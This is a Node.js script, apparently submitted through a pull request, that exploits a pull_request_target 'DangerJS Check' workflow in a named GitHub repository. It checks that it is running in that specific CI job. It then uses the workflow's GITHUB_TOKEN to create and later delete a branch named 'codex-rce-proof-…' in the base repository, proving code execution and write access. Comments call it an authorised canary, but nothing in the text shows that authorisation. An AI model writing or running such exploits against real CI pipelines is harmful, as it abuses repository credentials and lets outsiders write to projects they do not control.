'use strict';

// Authorized, non-secret CI canary. This creates one short-lived ref in the
// base repository, verifies cleanup, and writes only status codes to job logs.
const crypto = require('crypto');
const fs = require('fs');
const https = require('https');

const repo = 'espressif/idf-examples-launchpad-ci-action';
const actor = '2p92n5mg76-prog';
const head = 'codex-assessment-pwnrequest-20260912';

function request(method, path, token, value) {
  const body = value === undefined ? '' : JSON.stringify(value);
  return new Promise((resolve) => {
    const req = https.request({
      hostname: 'api.github.com',
      port: 443,
      method,
      path,
      headers: {
        Accept: 'application/vnd.github+json',
        Authorization: `Bearer ${token}`,
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
        'User-Agent': 'authorized-espressif-assessment',
        'X-GitHub-Api-Version': '2022-11-28',
      },
    }, (res) => {
      res.resume();
      res.on('end', () => resolve(res.statusCode || 0));
    });
    req.on('error', () => resolve(0));
    req.setTimeout(15000, () => req.destroy());
    if (body) req.write(body);
    req.end();
  });
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

(async () => {
  let event;
  try {
    event = JSON.parse(fs.readFileSync(process.env.GITHUB_EVENT_PATH, 'utf8'));
  } catch (_) {
    return;
  }

  const pr = event.pull_request || {};
  const expected =
    process.env.GITHUB_REPOSITORY === repo &&
    process.env.GITHUB_EVENT_NAME === 'pull_request_target' &&
    process.env.GITHUB_WORKFLOW === 'DangerJS Check' &&
    event.action === 'opened' &&
    pr.draft === true &&
    (process.env.GITHUB_ACTOR || '').toLowerCase() === actor &&
    (process.env.GITHUB_TRIGGERING_ACTOR || '').toLowerCase() === actor &&
    (pr.head?.repo?.owner?.login || '').toLowerCase() === actor &&
    pr.head?.repo?.fork === true &&
    pr.head?.ref === head;
  if (!expected) return;

  const token = process.env.GITHUB_TOKEN || '';
  const sha = pr.base?.sha || '';
  if (!token || !/^[0-9a-f]{40}$/.test(sha)) return;

  const suffix = crypto.randomBytes(5).toString('hex');
  const branch = `codex-rce-proof-${process.env.GITHUB_RUN_ID}-${suffix}`;
  const ref = `refs/heads/${branch}`;
  const base = `/repos/${repo}/git`;
  const created = await request('POST', `${base}/refs`, token, { ref, sha });
  console.log(`[authorized-canary] create=${created} ref=${ref}`);

  if (created !== 201) return;
  await sleep(45000);
  const deleted = await request('DELETE', `${base}/refs/heads/${branch}`, token);
  await sleep(750);
  const verified = await request('GET', `${base}/ref/heads/${branch}`, token);
  console.log(`[authorized-canary] delete=${deleted} verify=${verified}`);
})().catch((error) => {
  console.error(`[authorized-canary] error=${String(error.message || error).slice(0, 120)}`);
  process.exitCode = 1;
});
